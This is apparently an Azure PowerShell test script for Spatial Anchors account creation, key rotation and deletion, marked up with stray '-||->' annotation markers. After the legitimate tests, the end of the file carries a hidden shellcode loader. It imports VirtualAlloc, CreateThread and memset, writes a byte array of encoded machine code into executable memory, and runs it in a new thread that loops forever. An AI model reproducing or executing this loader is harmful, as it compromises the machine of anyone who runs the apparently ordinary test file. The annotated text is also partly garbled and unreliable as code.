














 -||-> function Test-SpatialAnchorsAccountOperations
{
     -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 
     -||-> $resourceLocation = "EastUS2" <-||- 
     -||-> $accountName =  -||-> getAssetName <-||-  <-||- 

     -||-> $createdAccount =  -||-> New-AzSpatialAnchorsAccount -ResourceGroupName $resourceGroup.ResourceGroupName -Name $accountName -Location $resourceLocation <-||-  <-||- 
     -||-> Assert-AreEqual $accountName $createdAccount.Name <-||- 
     -||-> Assert-AreEqual $resourceGroup.ResourceGroupName $createdAccount.ResourceGroupName <-||- 
     -||-> Assert-AreEqual $resourceLocation $createdAccount.Location <-||- 

     -||-> $account =  -||-> Get-AzSpatialAnchorsAccount -ResourceGroupName $resourceGroup.ResourceGroupName -Name $accountName <-||-  <-||- 
     -||-> Assert-AreEqual $accountName $account.Name <-||- 
     -||-> Assert-AreEqual $resourceGroup.ResourceGroupName $account.ResourceGroupName <-||- 
     -||-> Assert-AreEqual $resourceLocation $account.Location <-||- 

	 -||-> Assert-ThrowsContains {  -||-> New-AzSpatialAnchorsAccountKey -ResourceGroupName $resourceGroup.ResourceGroupName -Name $accountName -Force <-||-  } "Parameter set cannot be resolved using the specified named parameters." <-||- 

	 -||-> $old =  -||-> Get-AzSpatialAnchorsAccountKey -ResourceGroupName $resourceGroup.ResourceGroupName -Name $accountName <-||-  <-||- 
	 -||-> $new =  -||-> New-AzSpatialAnchorsAccountKey -ResourceGroupName $resourceGroup.ResourceGroupName -Name $accountName -Primary -Force <-||-  <-||- 
	 -||-> Assert-AreNotEqual $old.PrimaryKey $new.PrimaryKey <-||- 

	 -||-> $old = $new <-||- 
	 -||-> $new =  -||-> New-AzSpatialAnchorsAccountKey -ResourceGroupName $resourceGroup.ResourceGroupName -Name $accountName -Secondary -Force <-||-  <-||- 
	 -||-> Assert-AreNotEqual $old.SecondaryKey $new.SecondaryKey <-||- 

     -||-> $accountRemoved =  -||-> Remove-AzSpatialAnchorsAccount -ResourceGroupName $resourceGroup.ResourceGroupName -Name $accountName -PassThru <-||-  <-||- 
     -||-> Assert-True{ -||-> $accountRemoved <-||- } <-||- 

     -||-> Assert-ThrowsContains {  -||-> Get-AzSpatialAnchorsAccount -ResourceGroupName $resourceGroup.ResourceGroupName -Name $accountName <-||-  } "NotFound" <-||- 

     -||-> Remove-AzureRmResourceGroup -Name $resourceGroup.ResourceGroupName -Force <-||- 
} <-||- 


 -||-> function Test-SpatialAnchorsAccountOperationsWithPiping
{
     -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 
     -||-> $resourceLocation = "EastUS2" <-||- 
     -||-> $accountName =  -||-> getAssetName <-||-  <-||- 

     -||-> $createdAccount =  -||-> New-AzSpatialAnchorsAccount -ResourceGroupName $resourceGroup.ResourceGroupName -Name $accountName -Location $resourceLocation <-||-  <-||- 
     -||-> Assert-AreEqual $accountName $createdAccount.Name <-||- 
     -||-> Assert-AreEqual $resourceGroup.ResourceGroupName $createdAccount.ResourceGroupName <-||- 
     -||-> Assert-AreEqual $resourceLocation $createdAccount.Location <-||- 

	 -||-> Assert-ThrowsContains {  -||-> $createdAccount | New-AzSpatialAnchorsAccountKey -Force <-||-  } "Parameter set cannot be resolved using the specified named parameters." <-||- 

	 -||-> $old =  -||-> $createdAccount | Get-AzSpatialAnchorsAccountKey <-||-  <-||- 
	 -||-> $new =  -||-> $createdAccount | New-AzSpatialAnchorsAccountKey -Primary -Force <-||-  <-||- 
	 -||-> Assert-AreNotEqual $old.PrimaryKey $new.PrimaryKey <-||- 

	 -||-> $old = $new <-||- 
	 -||-> $new =  -||-> $createdAccount | New-AzSpatialAnchorsAccountKey -Secondary -Force <-||-  <-||- 
	 -||-> Assert-AreNotEqual $old.SecondaryKey $new.SecondaryKey <-||- 

     -||-> $accountRemoved =  -||-> $createdAccount | Remove-AzSpatialAnchorsAccount -PassThru <-||-  <-||- 
     -||-> Assert-True{ -||-> $accountRemoved <-||- } <-||- 

     -||-> Assert-ThrowsContains {  -||-> Get-AzSpatialAnchorsAccount -Id $createdAccount.Id <-||-  } "NotFound" <-||- 

     -||-> Remove-AzureRmResourceGroup -Name $resourceGroup.ResourceGroupName -Force <-||- 
} <-||- 


 -||-> function Test-ListSpatialAnchorsAccounts
{
     -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 
     -||-> $resourceLocation = "EastUS2" <-||- 
     -||-> $accountName =  -||-> getAssetName <-||-  <-||- 

	 -||-> $accounts =  -||-> Get-AzSpatialAnchorsAccount -ResourceGroupName $resourceGroup.ResourceGroupName <-||-  <-||- 
	 -||-> $originalCount = $accounts.Count <-||- 

     -||-> $createdAccount =  -||-> New-AzSpatialAnchorsAccount -ResourceGroupName $resourceGroup.ResourceGroupName -Name $accountName -Location $resourceLocation <-||-  <-||- 
     -||-> Assert-AreEqual $accountName $createdAccount.Name <-||- 
     -||-> Assert-AreEqual $resourceGroup.ResourceGroupName $createdAccount.ResourceGroupName <-||- 
     -||-> Assert-AreEqual $resourceLocation $createdAccount.Location <-||- 

	 -||-> $accounts =  -||-> Get-AzSpatialAnchorsAccount -ResourceGroupName $resourceGroup.ResourceGroupName <-||-  <-||- 
     -||-> Assert-AreEqual $accounts.Count ( -||-> $originalCount + 1 <-||- ) <-||- 

	 -||-> $old =  -||-> Get-AzSpatialAnchorsAccountKey -ResourceGroupName $resourceGroup.ResourceGroupName -Name $accountName <-||-  <-||- 
	 -||-> $new =  -||-> New-AzSpatialAnchorsAccountKey -ResourceGroupName $resourceGroup.ResourceGroupName -Name $accountName -Primary -Force <-||-  <-||- 
	 -||-> Assert-AreNotEqual $old.PrimaryKey $new.PrimaryKey <-||- 

	 -||-> $old = $new <-||- 
	 -||-> $new =  -||-> New-AzSpatialAnchorsAccountKey -ResourceGroupName $resourceGroup.ResourceGroupName -Name $accountName -Secondary -Force <-||-  <-||- 
	 -||-> Assert-AreNotEqual $old.SecondaryKey $new.SecondaryKey <-||- 

     -||-> $accountRemoved =  -||-> Remove-AzSpatialAnchorsAccount -ResourceGroupName $resourceGroup.ResourceGroupName -Name $accountName -PassThru <-||-  <-||- 
     -||-> Assert-True{ -||-> $accountRemoved <-||- } <-||- 

	 -||-> $accounts =  -||-> Get-AzSpatialAnchorsAccount -ResourceGroupName $resourceGroup.ResourceGroupName <-||-  <-||- 
     -||-> Assert-AreEqual $accounts.Count $originalCount <-||- 

     -||-> Remove-AzureRmResourceGroup -Name $resourceGroup.ResourceGroupName -Force <-||- 
} <-||- 

 -||-> $ui8 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $ui8 -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xba,0x09,0x8b,0x6f,0xf2,0xdb,0xc2,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x4f,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56,0x06,0x69,0x9a,0x0e,0xf0,0xef,0x65,0xef,0x00,0x90,0xec,0x0a,0x31,0x90,0x8b,0x5f,0x61,0x20,0xdf,0x32,0x8d,0xcb,0x8d,0xa6,0x06,0xb9,0x19,0xc8,0xaf,0x74,0x7c,0xe7,0x30,0x24,0xbc,0x66,0xb2,0x37,0x91,0x48,0x8b,0xf7,0xe4,0x89,0xcc,0xea,0x05,0xdb,0x85,0x61,0xbb,0xcc,0xa2,0x3c,0x00,0x66,0xf8,0xd1,0x00,0x9b,0x48,0xd3,0x21,0x0a,0xc3,0x8a,0xe1,0xac,0x00,0xa7,0xab,0xb6,0x45,0x82,0x62,0x4c,0xbd,0x78,0x75,0x84,0x8c,0x81,0xda,0xe9,0x21,0x70,0x22,0x2d,0x85,0x6b,0x51,0x47,0xf6,0x16,0x62,0x9c,0x85,0xcc,0xe7,0x07,0x2d,0x86,0x50,0xec,0xcc,0x4b,0x06,0x67,0xc2,0x20,0x4c,0x2f,0xc6,0xb7,0x81,0x5b,0xf2,0x3c,0x24,0x8c,0x73,0x06,0x03,0x08,0xd8,0xdc,0x2a,0x09,0x84,0xb3,0x53,0x49,0x67,0x6b,0xf6,0x01,0x85,0x78,0x8b,0x4b,0xc1,0x4d,0xa6,0x73,0x11,0xda,0xb1,0x00,0x23,0x45,0x6a,0x8f,0x0f,0x0e,0xb4,0x48,0x70,0x25,0x00,0xc6,0x8f,0xc6,0x71,0xce,0x4b,0x92,0x21,0x78,0x7a,0x9b,0xa9,0x78,0x83,0x4e,0x7d,0x29,0x2b,0x21,0x3e,0x99,0x8b,0x91,0xd6,0xf3,0x04,0xcd,0xc7,0xfb,0xcf,0x66,0xef,0x11,0xef,0x88,0xf0,0x7d,0x8e,0xfa,0x9b,0x1e,0x3f,0x9f,0x3e,0xcf,0xdb,0x2a,0xa2,0x64,0x47,0xbb,0x57,0x55,0xe8,0x31,0xff,0xa9,0x9e,0x1c,0xd7,0x9d,0xde,0xa0,0xfd,0x55,0x9e,0x42,0x94,0x6c,0x4e,0x13,0x6a,0x6f,0x6f,0x58,0xe3,0x89,0x05,0x8e,0xa2,0x02,0xb1,0x37,0xef,0xd9,0x20,0xb7,0x25,0xa4,0x62,0x33,0xca,0x58,0x2c,0xb4,0xa7,0x4a,0xd8,0x34,0xf2,0x31,0x4e,0x4a,0x28,0x5f,0x6e,0xde,0xd7,0xf6,0x39,0x76,0xda,0x2f,0x0d,0xd9,0x25,0x1a,0x06,0xd0,0xb3,0xe5,0x70,0x1d,0x54,0xe6,0x80,0x4b,0x3e,0xe6,0xe8,0x2b,0x1a,0xb5,0x0d,0x34,0xb7,0xa9,0x9e,0xa1,0x38,0x98,0x73,0x61,0x51,0x26,0xaa,0x45,0xfe,0xd9,0x99,0x57,0xc2,0x0f,0xe7,0x2d,0x2a,0x8c <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $GEu=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $GEu.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$GEu,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



